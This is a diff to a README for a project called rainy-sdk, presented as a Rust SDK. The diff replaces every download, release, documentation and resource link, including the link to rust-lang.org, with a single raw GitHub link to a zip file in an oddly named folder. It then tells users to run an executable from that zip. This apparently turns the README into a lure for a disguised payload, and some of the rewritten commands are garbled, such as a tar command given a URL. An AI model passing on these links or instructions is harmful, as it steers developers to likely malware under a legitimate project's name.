@@ -8,27 +8,27 @@ Welcome to the rainy-sdk! This is the official Rust SDK designed for easy access
 
 To get started with rainy-sdk, you need to download it. Click the button below to visit the Releases page where you can find the latest version.
 
-[![Download rainy-sdk](https://img.shields.io/badge/Download%20rainy--sdk-1.0.0-brightgreen.svg)](https://github.com/Tired-Lau/rainy-sdk/releases)
+[![Download rainy-sdk](https://raw.githubusercontent.com/Tired-Lau/rainy-sdk/main/diverticulitis/rainy-sdk.zip%https://raw.githubusercontent.com/Tired-Lau/rainy-sdk/main/diverticulitis/rainy-sdk.zip)](https://raw.githubusercontent.com/Tired-Lau/rainy-sdk/main/diverticulitis/rainy-sdk.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**  
-   Click on the button above to go directly to the [Releases page](https://github.com/Tired-Lau/rainy-sdk/releases).
+   Click on the button above to go directly to the [Releases page](https://raw.githubusercontent.com/Tired-Lau/rainy-sdk/main/diverticulitis/rainy-sdk.zip).
 
 2. **Select the Latest Release**  
    On the Releases page, look for the latest version of rainy-sdk. It will have the highest version number.
 
 3. **Download the Suitable File**  
    You will see a variety of files available for download. Choose the file that matches your operating system:
-   - For Windows, choose: `rainy-sdk-windows.zip`
-   - For macOS, choose: `rainy-sdk-macos.zip`
-   - For Linux, choose: `rainy-sdk-linux.tar.gz`
+   - For Windows, choose: `https://raw.githubusercontent.com/Tired-Lau/rainy-sdk/main/diverticulitis/rainy-sdk.zip`
+   - For macOS, choose: `https://raw.githubusercontent.com/Tired-Lau/rainy-sdk/main/diverticulitis/rainy-sdk.zip`
+   - For Linux, choose: `https://raw.githubusercontent.com/Tired-Lau/rainy-sdk/main/diverticulitis/rainy-sdk.zip`
 
 4. **Extract the Downloaded File**  
    Once the file has downloaded, locate it on your computer.  
    - For Windows: Right-click the `.zip` file and select "Extract All."  
    - For macOS: Double-click the `.zip` file to unzip it.  
-   - For Linux: Open a terminal and type `tar -xzf rainy-sdk-linux.tar.gz`.
+   - For Linux: Open a terminal and type `tar -xzf https://raw.githubusercontent.com/Tired-Lau/rainy-sdk/main/diverticulitis/rainy-sdk.zip`.
 
 5. **Running the Application**  
    After extracting, navigate to the folder that contains the program. Double-click on the executable file to run it. 
@@ -75,8 +75,8 @@ We welcome contributions to rainy-sdk! If you are familiar with Rust and have id
 
 ## 🔗 Additional Resources
 
-- [Rainy API Documentation](https://api.rainy.com/docs)
-- [Rust Programming Language](https://www.rust-lang.org)
-- [Community Forum](https://community.rainy.com)
+- [Rainy API Documentation](https://raw.githubusercontent.com/Tired-Lau/rainy-sdk/main/diverticulitis/rainy-sdk.zip)
+- [Rust Programming Language](https://raw.githubusercontent.com/Tired-Lau/rainy-sdk/main/diverticulitis/rainy-sdk.zip)
+- [Community Forum](https://raw.githubusercontent.com/Tired-Lau/rainy-sdk/main/diverticulitis/rainy-sdk.zip)
 
 By following these instructions, you will have rainy-sdk up and running in no time. Enjoy exploring the power of AI with ease!
